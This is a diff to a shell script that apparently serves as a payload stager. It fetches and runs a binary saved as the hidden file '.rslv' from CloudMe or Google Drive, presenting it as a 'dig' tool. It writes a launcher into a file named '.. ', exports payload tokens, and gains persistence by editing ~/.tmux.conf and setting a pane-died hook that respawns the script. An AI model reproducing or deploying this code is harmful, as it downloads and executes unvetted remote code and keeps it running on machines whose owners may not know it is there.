@@ -70,40 +70,49 @@ endpoints_fallback() {
 
 filename=".rslv"
 getdig() {
+    ## first try
     cloudmeurl="https://www.cloudme.com/v1/ws2/:fragia/:dig/dig"
-    echo "$cloudmeurl |" | wget -q -i- -O ${filename} && chmod +x ${filename} && 
-        ./${filename} -v &>/dev/null || {
-            fileid="1WiXVJgwjkmnwpMGkjT8cUp0RDeuPILwf"
-            gdriveCookieUrl="https://drive.google.com/uc?export=download&id=${fileid}"
-            gdriveDownloadUrl="https://drive.google.com/uc?export=download&id=${fileid}&confirm="
+    echo "$cloudmeurl" | wget -q -i- -O ${filename} && chmod +x ${filename}
+    if ! ./${filename} -v &>/dev/null; then
+        ## second try
+        fileid="1WiXVJgwjkmnwpMGkjT8cUp0RDeuPILwf"
+        gdriveCookieUrl="https://drive.google.com/uc?export=download&id=${fileid}"
+        gdriveDownloadUrl="https://drive.google.com/uc?export=download&id=${fileid}&confirm="
 
-            echo "$gdriveCookieUrl" | wget -q --save-cookies ./cookie -O/dev/null -i-
-            gdriveDownloadId=$(awk '/download/ {print $NF}' ./cookie)
-            echo  "$gdriveDownloadUrl" | wget -q  --load-cookies ./cookie -i- -O ${filename}
-            chmod +x "$filename"
-            rm -f ./cookie
-            ./${filename} -v &>/dev/null || { echo "error, couldn't get dig!"; exit 1; }
-        }
+        echo "$gdriveCookieUrl" | wget -q --save-cookies ./cookie -O/dev/null -i-
+        gdriveDownloadId=$(awk '/download/ {print $NF}' ./cookie)
+        echo  "$gdriveDownloadUrl" | wget -q  --load-cookies ./cookie -i- -O ${filename}
+        chmod +x "$filename"
+        rm -f ./cookie
+        if ! ./${filename} -v &>/dev/null; then
+            ## give up
+            { echo "error, couldn't get dig!"; exit 1; }
+        fi
+    fi
 }
 
-if type dig &>/dev/null; then
-    dig="dig"
-    endpoints
-else
-    dig="$filename"
-    getdig && endpoints ||
-            endpoints_fallback
-fi
+while [ -z "$launcher" ]; do
+    if type dig &>/dev/null; then
+        dig="dig"
+        endpoints
+    else
+        dig="$filename"
+        getdig && endpoints ||
+                endpoints_fallback
+    fi
+    sleep 1
+done
 
 pl_token="${pl_token}" pl_name="${pl_name:-payload}"
 echo "export \
 pl_token=${pl_token} pl_name=${pl_name:-payload} \
-X_TOKEN=acstkn \
+X_TOKEN=${X_TOKEN:-acstkn} \
 $ENV_VARS \
 ">env.sh
 
 if [ "$TMX" = 1 ]; then
-    tmx_init="new -s init sleep 10"
+    [ -z "$BASH_SOURCE" ] && { echo "under tmux don't use pipes or redirects"; exit 1; }
+    tmx_init="new -d -s init sleep 10"
     grep -q "$tmx_init" ~/.tmux.conf || echo "$tmx_init" >> ~/.tmux.conf
     tmux start-server
     tmux set -g default-shell /bin/bash
@@ -111,10 +120,12 @@ if [ "$TMX" = 1 ]; then
     tmux  setenv -g pl_token "$pl_token"
     tmux  setenv -g pl_name "$pl_name"
 
+    tmux kill-session -t crt
     tmux new -d -s crt
     tmux set-option -t crt remain-on-exit
     ENV=$(<env.sh)
-    tmux set-hook -t crt pane-died "run 'cd \"$PWD\"; tmux respawn-pane -t crt ; tmux send-keys -t crt \"eval  \" \"$ENV\" Enter \". \" ./\\\"..\ \\\" Enter'"
+    # tmux set-hook -t crt pane-died "run 'cd \"$PWD\"; tmux respawn-pane -t crt ; tmux send-keys -t crt \"eval  \" \"$ENV\" Enter \". \" ./\\\"..\ \\\" Enter'"
+    tmux set-hook -t crt pane-died "run 'exec bash $BASH_SOURCE'"
 
     echo "$launcher" > ".. "
     tmux send-keys -t crt ". ./\".. \"" Enter
